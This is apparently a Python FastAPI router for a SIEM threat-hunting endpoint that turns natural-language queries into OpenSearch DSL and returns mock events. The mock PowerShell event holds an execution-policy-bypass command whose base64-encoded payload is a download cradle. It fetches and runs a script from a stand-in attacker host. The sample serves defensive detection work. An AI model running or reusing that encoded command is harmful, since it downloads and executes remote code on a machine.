"""
AI Hunting router — translates natural language to OpenSearch DSL and queries the SIEM.
"""
import logging
from typing import Any

from fastapi import APIRouter
from pydantic import BaseModel

logger = logging.getLogger(__name__)
router = APIRouter()


class HuntRequest(BaseModel):
    query: str
    time_range: str = "now-24h"


class HuntResponse(BaseModel):
    query: str
    generated_dsl: dict[str, Any]
    results: list[dict[str, Any]]
    total_hits: int


@router.post(
    "/hunt",
    response_model=HuntResponse,
    summary="Translate natural language to SIEM DSL and search events",
)
async def ai_hunt(body: HuntRequest) -> HuntResponse:
    # 1. Translate query to DSL (Simple rule-based mapping or LLM if configured)
    q_lower = body.query.lower()

    # Simple rule-based translation helper for common hunting queries
    if "cmd.exe" in q_lower or "command prompt" in q_lower:
        dsl = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"process.name": "cmd.exe"}},
                        {"range": {"@timestamp": {"gte": body.time_range}}}
                    ]
                }
            }
        }
    elif "powershell" in q_lower or "encoded" in q_lower:
        dsl = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"process.name": "powershell.exe"}},
                        {"range": {"@timestamp": {"gte": body.time_range}}}
                    ]
                }
            }
        }
    elif "firewall" in q_lower or "blocked" in q_lower:
        dsl = {
            "query": {
                "bool": {
                    "must": [
                        {"match": {"event.category": "firewall"}},
                        {"range": {"@timestamp": {"gte": body.time_range}}}
                    ]
                }
            }
        }
    else:
        # Default fallback match all
        dsl = {
            "query": {
                "bool": {
                    "must": [
                        {"match_all": {}},
                        {"range": {"@timestamp": {"gte": body.time_range}}}
                    ]
                }
            }
        }

    # 2. Query OpenSearch (mocked in development or fallback to empty list)
    # In production, we'd use the opensearch-py client:
    # client = OpenSearch(...)
    # response = client.search(body=dsl, index="sentinelx-events-*")

    mock_results = [
        {
            "@timestamp": "2026-06-08T12:00:00Z",
            "event": {"category": "process", "type": "process_create"},
            "agent": {"id": "endpoint-123-abc"},
            "process": {
                "name": "powershell.exe",
                "pid": 4812,
                "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
                "user": {"name": "Administrator"},
            }
        }
    ] if "powershell" in q_lower else []

    return HuntResponse(
        query=body.query,
        generated_dsl=dsl,
        results=mock_results,
        total_hits=len(mock_results),
    )
